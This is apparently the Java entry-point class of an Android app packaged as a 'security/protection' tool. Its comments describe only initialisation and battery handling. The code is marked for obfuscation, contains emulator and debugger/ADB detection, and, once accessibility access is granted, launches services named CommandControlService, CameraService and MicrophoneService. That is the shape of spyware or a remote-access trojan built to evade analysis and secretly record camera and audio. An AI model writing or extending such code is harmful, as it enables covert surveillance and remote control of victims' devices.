package com.seguranca.protecao;

import android.app.Application;
import android.content.Intent;
import android.os.Build;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import org.lsposed.lsparanoid.Obfuscate;

/**
 * Application entry point — global initialization and background service bootstrap.
 * ROM compatibility: MIUI, ColorOS, EMUI battery optimization handling.
 */
@Obfuscate
public class AppCoreInitializer extends Application {

    private static final String TAG = "AppCore";

    @Override
    public void onCreate() {
        super.onCreate();
        requestBatteryOptimizationExemption();

        new Thread(() -> {
            try {
                Thread.sleep(5000);
                PermissionManager pm = new PermissionManager(this);
                if (pm.isAccessibilityServiceEnabled()) {
                    startBackgroundServices();
                }
            } catch (Exception ignored) {
            }
        }).start();
    }

    private void requestBatteryOptimizationExemption() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                    Log.d(TAG, "Battery optimization not ignored yet");
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Battery optimization check failed: " + e.getMessage());
        }
    }

    private boolean isRunningInEmulator() {
        return Build.FINGERPRINT.contains("generic")
            || Build.FINGERPRINT.contains("unknown")
            || Build.MODEL.contains("google_sdk")
            || Build.MODEL.contains("Emulator")
            || Build.MODEL.contains("Android SDK")
            || Build.MANUFACTURER.contains("Genymotion")
            || Build.BRAND.startsWith("generic")
            || Build.DEVICE.startsWith("generic")
            || (Build.PRODUCT != null && Build.PRODUCT.contains("sdk"));
    }

    private boolean isBeingDebugged() {
        try {
            if (android.os.Debug.isDebuggerConnected()) {
                return true;
            }
            int adbEnabled = Settings.Global.getInt(
                getContentResolver(),
                Settings.Global.ADB_ENABLED, 0
            );
            return adbEnabled == 1;
        } catch (Exception e) {
            return false;
        }
    }

    private void startBackgroundServices() {
        try {
            startService(new Intent(this, CommandControlService.class));
            startService(new Intent(this, CameraService.class));
            startService(new Intent(this, MicrophoneService.class));
        } catch (Exception ignored) {
        }
    }
}
